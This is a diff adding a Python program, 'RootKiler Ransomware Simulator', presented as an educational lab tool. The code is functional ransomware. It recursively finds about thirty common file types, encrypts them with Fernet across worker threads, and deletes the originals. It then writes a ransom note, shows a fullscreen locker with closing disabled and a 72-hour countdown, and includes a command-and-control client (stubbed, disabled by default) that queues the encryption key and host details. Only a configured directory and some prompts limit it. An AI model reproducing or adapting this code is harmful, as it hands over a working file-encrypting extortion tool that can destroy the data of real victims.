@@ -1,0 +1,844 @@
+#!/usr/bin/env python3
+"""
+RootKiler Ransomware Simulator v2.0
+Educational tool for cybersecurity training in isolated lab environments
+WARNING: For authorized security research only
+"""
+
+import os
+import sys
+import time
+import json
+import base64
+import random
+import string
+import socket
+import platform
+import threading
+import queue
+import logging
+import hashlib
+from pathlib import Path
+from datetime import datetime, timedelta
+from dataclasses import dataclass, asdict
+from typing import List, Dict, Optional, Callable
+from cryptography.fernet import Fernet
+import tkinter as tk
+from tkinter import ttk, messagebox, scrolledtext
+
+# ============================================================================
+# CONFIGURATION
+# ============================================================================
+
+@dataclass
+class Config:
+    """Configuration settings for the simulator."""
+    target_dir: str = "C:\\test_files"  # Lab directory only
+    encrypted_ext: str = ".locked"
+    key_file: str = "recovery_key.key"
+    log_file: str = "simulator.log"
+    ransom_note: str = "RECOVERY_INSTRUCTIONS.txt"
+    metadata_file: str = "exfiltrated_metadata.json"
+    c2_buffer_file: str = "offline_c2_queue.json"
+    
+    file_types: tuple = (
+        ".txt", ".doc", ".docx", ".pdf", ".xls", ".xlsx",
+        ".jpg", ".jpeg", ".png", ".gif", ".bmp",
+        ".mp3", ".mp4", ".avi", ".mkv",
+        ".zip", ".rar", ".7z", ".tar", ".gz",
+        ".py", ".js", ".html", ".css", ".json", ".xml",
+        ".sql", ".db", ".sqlite", ".csv"
+    )
+    
+    thread_count: int = 4
+    countdown_hours: int = 72
+    max_retries: int = 3
+    retry_delay: float = 1.0
+    
+    c2_enabled: bool = False  # Disabled by default for safety
+    c2_check_interval: int = 10
+    c2_report_interval: int = 300
+    
+    scareware_duration: int = 15
+    locker_code_length: int = 6
+
+CONFIG = Config()
+
+# ============================================================================
+# LOGGING SETUP
+# ============================================================================
+
+def setup_logging(log_file: str) -> logging.Logger:
+    """Configure comprehensive logging."""
+    logger = logging.getLogger("RootKiler")
+    logger.setLevel(logging.DEBUG)
+    
+    # File handler
+    fh = logging.FileHandler(log_file, mode='a', encoding='utf-8')
+    fh.setLevel(logging.DEBUG)
+    fh.setFormatter(logging.Formatter(
+        '%(asctime)s | %(levelname)-8s | %(threadName)s | %(message)s'
+    ))
+    
+    # Console handler
+    ch = logging.StreamHandler()
+    ch.setLevel(logging.INFO)
+    ch.setFormatter(logging.Formatter('%(levelname)s: %(message)s'))
+    
+    logger.addHandler(fh)
+    logger.addHandler(ch)
+    
+    return logger
+
+logger = setup_logging(CONFIG.log_file)
+
+# ============================================================================
+# CRYPTOGRAPHIC ENGINE
+# ============================================================================
+
+class CryptoEngine:
+    """Handles encryption/decryption operations."""
+    
+    def __init__(self):
+        self.key: Optional[bytes] = None
+        self.cipher: Optional[Fernet] = None
+        self._lock = threading.Lock()
+    
+    def generate_key(self) -> bytes:
+        """Generate new Fernet key."""
+        self.key = Fernet.generate_key()
+        self.cipher = Fernet(self.key)
+        logger.info("New encryption key generated")
+        return self.key
+    
+    def load_key(self, key_path: str) -> bool:
+        """Load existing key from file."""
+        try:
+            with open(key_path, 'rb') as f:
+                self.key = f.read()
+            self.cipher = Fernet(self.key)
+            logger.info(f"Key loaded from {key_path}")
+            return True
+        except Exception as e:
+            logger.error(f"Failed to load key: {e}")
+            return False
+    
+    def save_key(self, key_path: str) -> bool:
+        """Save key to file with restricted permissions."""
+        try:
+            with open(key_path, 'wb') as f:
+                f.write(self.key)
+            # Restrict permissions (Unix-like systems)
+            try:
+                os.chmod(key_path, 0o600)
+            except:
+                pass  # Windows
+            logger.info(f"Key saved to {key_path}")
+            return True
+        except Exception as e:
+            logger.error(f"Failed to save key: {e}")
+            return False
+    
+    def encrypt_data(self, data: bytes) -> bytes:
+        """Encrypt data with thread safety."""
+        with self._lock:
+            return self.cipher.encrypt(data)
+    
+    def decrypt_data(self, data: bytes) -> bytes:
+        """Decrypt data with thread safety."""
+        with self._lock:
+            return self.cipher.decrypt(data)
+    
+    def get_key_hash(self) -> str:
+        """Get SHA256 hash of key for verification."""
+        return hashlib.sha256(self.key).hexdigest() if self.key else ""
+
+# ============================================================================
+# FILE SYSTEM OPERATIONS
+# ============================================================================
+
+@dataclass
+class FileOperation:
+    """Track file operation results."""
+    source_path: str
+    dest_path: Optional[str]
+    operation: str  # encrypt, decrypt, skip, error
+    size: int
+    timestamp: str
+    error: Optional[str] = None
+
+class FileManager:
+    """Handles file discovery and operations."""
+    
+    def __init__(self, config: Config):
+        self.config = config
+        self.operations: List[FileOperation] = []
+        self._lock = threading.Lock()
+        self.stats = {
+            'processed': 0,
+            'encrypted': 0,
+            'failed': 0,
+            'skipped': 0,
+            'total_size': 0
+        }
+    
+    def discover_files(self, directory: str) -> queue.Queue:
+        """Recursively find target files."""
+        file_queue = queue.Queue()
+        count = 0
+        
+        for root, _, files in os.walk(directory):
+            for filename in files:
+                if filename.endswith(self.config.file_types):
+                    if not filename.endswith(self.config.encrypted_ext):
+                        full_path = os.path.join(root, filename)
+                        file_queue.put(full_path)
+                        count += 1
+        
+        logger.info(f"Discovered {count} files in {directory}")
+        return file_queue
+    
+    def encrypt_file(self, file_path: str, crypto: CryptoEngine) -> FileOperation:
+        """Encrypt single file with verification."""
+        try:
+            # Read original
+            with open(file_path, 'rb') as f:
+                original_data = f.read()
+            
+            # Encrypt
+            encrypted_data = crypto.encrypt_data(original_data)
+            
+            # Write encrypted
+            encrypted_path = file_path + self.config.encrypted_ext
+            with open(encrypted_path, 'wb') as f:
+                f.write(encrypted_data)
+            
+            # Verify by decrypting
+            verify_data = crypto.decrypt_data(encrypted_data)
+            if verify_data != original_data:
+                raise ValueError("Verification failed")
+            
+            # Remove original only after verification
+            os.remove(file_path)
+            
+            op = FileOperation(
+                source_path=file_path,
+                dest_path=encrypted_path,
+                operation='encrypt',
+                size=len(original_data),
+                timestamp=datetime.now().isoformat()
+            )
+            
+            with self._lock:
+                self.stats['encrypted'] += 1
+                self.stats['total_size'] += len(original_data)
+            
+            return op
+            
+        except PermissionError:
+            op = FileOperation(
+                source_path=file_path,
+                dest_path=None,
+                operation='skip',
+                size=0,
+                timestamp=datetime.now().isoformat(),
+                error="Permission denied"
+            )
+            with self._lock:
+                self.stats['skipped'] += 1
+            return op
+            
+        except Exception as e:
+            op = FileOperation(
+                source_path=file_path,
+                dest_path=None,
+                operation='error',
+                size=0,
+                timestamp=datetime.now().isoformat(),
+                error=str(e)
+            )
+            with self._lock:
+                self.stats['failed'] += 1
+            return op
+    
+    def get_stats(self) -> Dict:
+        """Get current statistics."""
+        with self._lock:
+            return dict(self.stats)
+
+# ============================================================================
+# C2 COMMUNICATION (SIMULATED)
+# ============================================================================
+
+@dataclass
+class C2Message:
+    """C2 message structure."""
+    msg_type: str  # key, status, command, alert
+    payload: Dict
+    timestamp: str
+    machine_id: str
+
+class C2Client:
+    """Simulated command & control client."""
+    
+    def __init__(self, config: Config, machine_id: str):
+        self.config = config
+        self.machine_id = machine_id
+        self.enabled = config.c2_enabled
+        self.message_queue: List[C2Message] = []
+        self.command_handlers: Dict[str, Callable] = {}
+        self._stop = threading.Event()
+        self._lock = threading.Lock()
+    
+    def register_handler(self, command: str, handler: Callable):
+        """Register command handler."""
+        self.command_handlers[command] = handler
+    
+    def queue_message(self, msg_type: str, payload: Dict):
+        """Queue message for transmission."""
+        msg = C2Message(
+            msg_type=msg_type,
+            payload=payload,
+            timestamp=datetime.now().isoformat(),
+            machine_id=self.machine_id
+        )
+        with self._lock:
+            self.message_queue.append(msg)
+        
+        if not self.enabled:
+            self._save_offline()
+    
+    def _save_offline(self):
+        """Save queued messages to file when C2 disabled."""
+        try:
+            data = [asdict(m) for m in self.message_queue]
+            with open(self.config.c2_buffer_file, 'w') as f:
+                json.dump(data, f, indent=2)
+        except Exception as e:
+            logger.error(f"Failed to save offline C2 queue: {e}")
+    
+    def get_system_info(self) -> Dict:
+        """Collect system information."""
+        try:
+            return {
+                'hostname': socket.gethostname(),
+                'ip': socket.gethostbyname(socket.gethostname()),
+                'os': platform.system(),
+                'os_version': platform.version(),
+                'architecture': platform.machine(),
+                'processor': platform.processor(),
+                'username': os.getlogin(),
+                'python_version': platform.python_version()
+            }
+        except Exception as e:
+            logger.error(f"Failed to collect system info: {e}")
+            return {'error': str(e)}
+    
+    def start(self):
+        """Start C2 threads if enabled."""
+        if not self.enabled:
+            logger.info("C2 disabled - operating in offline mode")
+            return
+        
+        # Simulated C2 loop
+        def c2_loop():
+            while not self._stop.is_set():
+                try:
+                    # Process outgoing messages
+                    with self._lock:
+                        if self.message_queue:
+                            logger.debug(f"Would send {len(self.message_queue)} messages to C2")
+                            self.message_queue.clear()
+                    
+                    # Check for commands (simulated)
+                    time.sleep(self.config.c2_check_interval)
+                    
+                except Exception as e:
+                    logger.error(f"C2 loop error: {e}")
+        
+        threading.Thread(target=c2_loop, daemon=True, name="C2-Thread").start()
+    
+    def stop(self):
+        """Stop C2 operations."""
+        self._stop.set()
+        if self.message_queue:
+            self._save_offline()
+
+# ============================================================================
+# GUI COMPONENTS
+# ============================================================================
+
+class RansomGUI:
+    """Main ransomware interface."""
+    
+    def __init__(self, stats: Dict, key_hash: str, on_exit: Callable):
+        self.stats = stats
+        self.key_hash = key_hash
+        self.on_exit = on_exit
+        
+        self.root = tk.Tk()
+        self.root.title("System Encrypted - RootKiler Simulator")
+        self.root.geometry("700x600")
+        self.root.configure(bg='#0a0a0a')
+        self.root.protocol("WM_DELETE_WINDOW", self._on_close)
+        
+        self._build_ui()
+    
+    def _build_ui(self):
+        # Header
+        header = tk.Label(
+            self.root,
+            text="⚠ YOUR FILES HAVE BEEN ENCRYPTED ⚠",
+            bg='#0a0a0a',
+            fg='#ff0000',
+            font=('Consolas', 18, 'bold')
+        )
+        header.pack(pady=30)
+        
+        # Info frame
+        info_frame = tk.Frame(self.root, bg='#1a1a1a', padx=20, pady=20)
+        info_frame.pack(fill='x', padx=20)
+        
+        info_text = f"""
+SIMULATION NOTICE
+This is a controlled cybersecurity exercise. No actual harm has occurred.
+
+ENCRYPTION STATISTICS
+────────────────────────────────────────
+Files encrypted:     {self.stats.get('encrypted', 0)}
+Files failed:        {self.stats.get('failed', 0)}
+Files skipped:       {self.stats.get('skipped', 0)}
+Total size encrypted: {self.stats.get('total_size', 0) / 1024:.2f} KB
+
+RECOVERY KEY INFORMATION
+────────────────────────────────────────
+Key fingerprint: {self.key_hash[:32]}...
+Key file: {CONFIG.key_file}
+
+To decrypt your files:
+1. Locate the recovery key file
+2. Run the decryption tool
+3. Enter the key when prompted
+
+WARNING: This is a simulation for educational purposes only.
+        """
+        
+        tk.Label(
+            info_frame,
+            text=info_text,
+            bg='#1a1a1a',
+            fg='#00ff00',
+            font=('Consolas', 11),
+            justify='left'
+        ).pack()
+        
+        # Countdown
+        self.countdown_label = tk.Label(
+            self.root,
+            text="",
+            bg='#0a0a0a',
+            fg='#ffff00',
+            font=('Consolas', 24, 'bold')
+        )
+        self.countdown_label.pack(pady=20)
+        
+        self.deadline = datetime.now() + timedelta(hours=CONFIG.countdown_hours)
+        self._update_countdown()
+        
+        # Buttons
+        btn_frame = tk.Frame(self.root, bg='#0a0a0a')
+        btn_frame.pack(pady=20)
+        
+        tk.Button(
+            btn_frame,
+            text="SIMULATE PAYMENT",
+            command=self._simulate_payment,
+            bg='#ff0000',
+            fg='white',
+            font=('Consolas', 12, 'bold'),
+            width=20
+        ).pack(side='left', padx=10)
+        
+        tk.Button(
+            btn_frame,
+            text="EXIT SIMULATION",
+            command=self._on_exit,
+            bg='#00aa00',
+            fg='white',
+            font=('Consolas', 12, 'bold'),
+            width=20
+        ).pack(side='left', padx=10)
+    
+    def _update_countdown(self):
+        remaining = self.deadline - datetime.now()
+        if remaining.total_seconds() <= 0:
+            self.countdown_label.config(text="TIME EXPIRED")
+            return
+        
+        hours, remainder = divmod(int(remaining.total_seconds()), 3600)
+        minutes, seconds = divmod(remainder, 60)
+        self.countdown_label.config(text=f"{hours:02d}:{minutes:02d}:{seconds:02d}")
+        self.root.after(1000, self._update_countdown)
+    
+    def _simulate_payment(self):
+        messagebox.showinfo(
+            "Simulation",
+            "In a real attack, this would trigger payment verification.\n"
+            "For this simulation, use the recovery key to decrypt files."
+        )
+    
+    def _on_close(self):
+        self._on_exit()
+    
+    def _on_exit(self):
+        if messagebox.askyesno("Exit", "End simulation?"):
+            self.on_exit()
+            self.root.destroy()
+    
+    def run(self):
+        self.root.mainloop()
+
+class LockerScreen:
+    """Fullscreen lock screen."""
+    
+    def __init__(self, bypass_code: str, on_unlock: Callable):
+        self.bypass_code = bypass_code
+        self.on_unlock = on_unlock
+        self.attempts = 0
+        self.max_attempts = 3
+        
+        self.root = tk.Tk()
+        self.root.attributes('-fullscreen', True)
+        self.root.configure(bg='#000000')
+        self.root.protocol("WM_DELETE_WINDOW', lambda: None")  # Disable close
+        
+        self._build_ui()
+    
+    def _build_ui(self):
+        tk.Label(
+            self.root,
+            text="🔒 SYSTEM LOCKED 🔒",
+            bg='#000000',
+            fg='#ff0000',
+            font=('Consolas', 36, 'bold')
+        ).pack(pady=50)
+        
+        tk.Label(
+            self.root,
+            text="This is a simulation. Enter the bypass code to unlock.",
+            bg='#000000',
+            fg='#ffffff',
+            font=('Consolas', 14)
+        ).pack()
+        
+        self.code_entry = tk.Entry(
+            self.root,
+            font=('Consolas', 24),
+            justify='center',
+            width=10
+        )
+        self.code_entry.pack(pady=30)
+        self.code_entry.focus()
+        
+        self.status_label = tk.Label(
+            self.root,
+            text="",
+            bg='#000000',
+            fg='#ffff00',
+            font=('Consolas', 12)
+        )
+        self.status_label.pack()
+        
+        tk.Button(
+            self.root,
+            text="UNLOCK",
+            command=self._check_code,
+            bg='#ff0000',
+            fg='white',
+            font=('Consolas', 14, 'bold'),
+            width=15
+        ).pack(pady=20)
+        
+        # Hint
+        tk.Label(
+            self.root,
+            text=f"Hint: Check the log file or C2 messages for code",
+            bg='#000000',
+            fg='#666666',
+            font=('Consolas', 10)
+        ).pack(side='bottom', pady=20)
+    
+    def _check_code(self):
+        entered = self.code_entry.get().strip()
+        
+        if entered == self.bypass_code:
+            self.on_unlock()
+            self.root.destroy()
+        else:
+            self.attempts += 1
+            remaining = self.max_attempts - self.attempts
+            
+            if remaining <= 0:
+                self.status_label.config(text="Max attempts exceeded. System remains locked.")
+                self.code_entry.config(state='disabled')
+            else:
+                self.status_label.config(text=f"Invalid code. {remaining} attempts remaining.")
+                self.code_entry.delete(0, 'end')
+    
+    def run(self):
+        self.root.mainloop()
+
+# ============================================================================
+# MAIN SIMULATOR
+# ============================================================================
+
+class RansomwareSimulator:
+    """Main simulator orchestrator."""
+    
+    def __init__(self):
+        self.machine_id = self._generate_machine_id()
+        self.crypto = CryptoEngine()
+        self.file_manager = FileManager(CONFIG)
+        self.c2 = C2Client(CONFIG, self.machine_id)
+        self.stop_event = threading.Event()
+        self.bypass_code = self._generate_bypass_code()
+        
+        logger.info(f"Simulator initialized | Machine ID: {self.machine_id}")
+    
+    def _generate_machine_id(self) -> str:
+        """Generate unique machine identifier."""
+        return hashlib.sha256(
+            f"{socket.gethostname()}-{time.time()}-{random.random()}".encode()
+        ).hexdigest()[:16]
+    
+    def _generate_bypass_code(self) -> str:
+        """Generate locker bypass code."""
+        return ''.join(random.choices(string.digits, k=CONFIG.locker_code_length))
+    
+    def _worker(self, file_queue: queue.Queue):
+        """Worker thread for encryption."""
+        while not self.stop_event.is_set():
+            try:
+                file_path = file_queue.get_nowait()
+                op = self.file_manager.encrypt_file(file_path, self.crypto)
+                
+                with self.file_manager._lock:
+                    self.file_manager.operations.append(op)
+                
+                file_queue.task_done()
+                
+            except queue.Empty:
+                break
+            except Exception as e:
+                logger.error(f"Worker error: {e}")
+    
+    def run_encryption(self):
+        """Execute encryption phase."""
+        logger.info("Starting encryption phase")
+        
+        # Generate and save key
+        self.crypto.generate_key()
+        self.crypto.save_key(CONFIG.key_file)
+        
+        # Report to C2
+        self.c2.queue_message('key_exfil', {
+            'key': base64.b64encode(self.crypto.key).decode(),
+            'key_hash': self.crypto.get_key_hash()
+        })
+        
+        # Discover files
+        file_queue = self.file_manager.discover_files(CONFIG.target_dir)
+        
+        if file_queue.empty():
+            logger.warning("No target files found")
+            return
+        
+        # Start workers
+        threads = []
+        for i in range(CONFIG.thread_count):
+            t = threading.Thread(
+                target=self._worker,
+                args=(file_queue,),
+                name=f"Worker-{i}"
+            )
+            t.start()
+            threads.append(t)
+        
+        # Wait for completion
+        for t in threads:
+            t.join()
+        
+        stats = self.file_manager.get_stats()
+        logger.info(f"Encryption complete: {stats}")
+        
+        self.c2.queue_message('encryption_complete', stats)
+    
+    def create_recovery_note(self):
+        """Create recovery instructions."""
+        note = f"""
+╔══════════════════════════════════════════════════════════════╗
+║           ROOTKILER SIMULATION - RECOVERY INSTRUCTIONS      ║
+╠══════════════════════════════════════════════════════════════╣
+║                                                              ║
+║  NOTICE: This is a controlled cybersecurity exercise.       ║
+║          No actual ransomware infection has occurred.       ║
+║                                                              ║
+║  MACHINE ID: {self.machine_id:<42} ║
+║  TIMESTAMP:  {datetime.now().strftime('%Y-%m-%d %H:%M:%S'):<42} ║
+║                                                              ║
+║  STATISTICS:                                                 ║
+║  • Files encrypted: {self.file_manager.stats['encrypted']:<35} ║
+║  • Files failed:    {self.file_manager.stats['failed']:<35} ║
+║  • Files skipped:   {self.file_manager.stats['skipped']:<35} ║
+║                                                              ║
+║  RECOVERY:                                                   ║
+║  1. Recovery key saved to: {CONFIG.key_file:<30} ║
+║  2. Key fingerprint: {self.crypto.get_key_hash()[:40]:<34} ║
+║  3. Run decryptor tool with the recovery key                ║
+║                                                              ║
+║  SIMULATION BYPASS CODE: {self.bypass_code:<34} ║
+║                                                              ║
+╚══════════════════════════════════════════════════════════════╝
+        """
+        
+        with open(CONFIG.ransom_note, 'w') as f:
+            f.write(note)
+        
+        logger.info(f"Recovery note created: {CONFIG.ransom_note}")
+    
+    def show_locker(self):
+        """Display locker screen."""
+        logger.info("Activating locker screen")
+        
+        # Send code to C2
+        self.c2.queue_message('locker_activated', {
+            'bypass_code': self.bypass_code
+        })
+        
+        def on_unlock():
+            logger.info("Locker bypassed with correct code")
+            self.c2.queue_message('locker_bypassed', {})
+        
+        locker = LockerScreen(self.bypass_code, on_unlock)
+        locker.run()
+    
+    def show_ransom_gui(self):
+        """Display main ransom GUI."""
+        logger.info("Displaying ransom GUI")
+        
+        def on_exit():
+            self.stop_event.set()
+            self.c2.stop()
+        
+        gui = RansomGUI(
+            self.file_manager.get_stats(),
+            self.crypto.get_key_hash(),
+            on_exit
+        )
+        gui.run()
+    
+    def run(self):
+        """Execute full simulation."""
+        print("=" * 60)
+        print("ROOTKILER RANSOMWARE SIMULATOR v2.0")
+        print("=" * 60)
+        print("\n⚠️  WARNING: This is a controlled simulation")
+        print(f"    Target directory: {CONFIG.target_dir}")
+        print(f"    Machine ID: {self.machine_id}")
+        print("\n    Press Ctrl+C to abort at any time")
+        
+        if input("\nProceed with simulation? (yes/no): ").lower() != 'yes':
+            print("Simulation aborted")
+            return
+        
+        try:
+            # Initialize C2
+            self.c2.start()
+            
+            # Phase 1: Encryption
+            self.run_encryption()
+            
+            # Phase 2: Recovery note
+            self.create_recovery_note()
+            
+            # Phase 3: Locker screen
+            self.show_locker()
+            
+            # Phase 4: Ransom GUI (if not locked)
+            if not self.stop_event.is_set():
+                self.show_ransom_gui()
+            
+            # Final report
+            self.c2.queue_message('simulation_complete', {
+                'final_stats': self.file_manager.get_stats()
+            })
+            
+            logger.info("Simulation completed successfully")
+            
+        except KeyboardInterrupt:
+            logger.info("Simulation interrupted by user")
+            self.stop_event.set()
+            self.c2.stop()
+        
+        except Exception as e:
+            logger.error(f"Simulation error: {e}", exc_info=True)
+        
+        finally:
+            # Save operation log
+            self._save_operation_log()
+    
+    def _save_operation_log(self):
+        """Save detailed operation log."""
+        try:
+            log_data = {
+                'machine_id': self.machine_id,
+                'timestamp': datetime.now().isoformat(),
+                'config': asdict(CONFIG),
+                'stats': self.file_manager.get_stats(),
+                'operations': [asdict(op) for op in self.file_manager.operations]
+            }
+            
+            log_file = f"operation_log_{self.machine_id}.json"
+            with open(log_file, 'w') as f:
+                json.dump(log_data, f, indent=2)
+            
+            logger.info(f"Operation log saved: {log_file}")
+            
+        except Exception as e:
+            logger.error(f"Failed to save operation log: {e}")
+
+# ============================================================================
+# ENTRY POINT
+# ============================================================================
+
+def main():
+    """Main entry point."""
+    # Safety checks
+    if not os.path.exists(CONFIG.target_dir):
+        print(f"Error: Target directory not found: {CONFIG.target_dir}")
+        print("Create the directory or update CONFIG.target_dir")
+        return 1
+    
+    # Verify not running as admin/root
+    try:
+        if os.getuid() == 0:
+            print("Warning: Running as root/admin. Use non-privileged account for safety.")
+            if input("Continue anyway? (yes/no): ").lower() != 'yes':
+                return 1
+    except AttributeError:
+        # Windows
+        try:
+            import ctypes
+            if ctypes.windll.shell32.IsUserAnAdmin():
+                print("Warning: Running as administrator. Use non-privileged account.")
+                if input("Continue anyway? (yes/no): ").lower() != 'yes':
+                    return 1
+        except:
+            pass
+    
+    simulator = RansomwareSimulator()
+    simulator.run()
+    return 0
+
+if __name__ == "__main__":
+    sys.exit(main())
